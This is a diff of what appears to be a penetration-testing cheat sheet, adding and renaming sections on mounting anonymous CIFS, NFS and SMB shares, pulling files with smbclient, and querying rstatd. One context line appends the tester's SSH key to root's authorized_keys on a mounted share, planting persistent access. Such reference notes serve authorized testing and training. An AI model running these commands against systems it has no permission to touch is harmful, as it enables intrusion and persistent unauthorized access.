@@ -593,7 +593,7 @@ Enter the replacement character.
 ------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------
 
-# CIFS Shares Anonymous Mountable
+# Anonymous Mountable CIFS
 
 mkdir /mnt/cifs/
 mount -t cifs -o username=user,domain=foo //<target IP>/share /mnt/cifs
@@ -603,21 +603,29 @@ OS X: mount -t cifs //<target IP>:Users/<user> /mnt/cifs/ -o user=<user>,pass=<p
 cat /root/.ssh/id_rsa.pub >> /tmp/mount/root/.ssh/authorized_keys
 ------------------------------------------------------------------------------------------------------
 
-# NFS Shares Anonymous Mountable
+# Anonymous Mountable NFS
 
 showmount -e <target IP>
 
 apt-get install nfs-common
-mkdir /mnt/nfs/
-mount -t nfs -o nolock <target IP>:/share /mnt/nfs/
+mkdir /mnt/temp/
+mount -t nfs -o nolock <target IP>:/<share> /mnt/temp/
+------------------------------------------------------------------------------------------------------
+
+# Anonymous Mountable SMB
+
+smbclient -L //<target IP>
+smbclient //<target IP>/<share>
+smb: \> ls
+smb: \> cd <directory>
+smb: \> cd "<long directory>"
+smb: \> get <file>
+
+mkdir /mnt/temp/
+mount -t cifs //<target IP>/<share> /mnt/temp/ -o user=anonymous
 ------------------------------------------------------------------------------------------------------
 
 # Rstatd enabled
 
 rsysinfo <target IP>
-------------------------------------------------------------------------------------------------------
-
-# Samba with a writeable file share
-
-smbclient -L //<target IP>
 
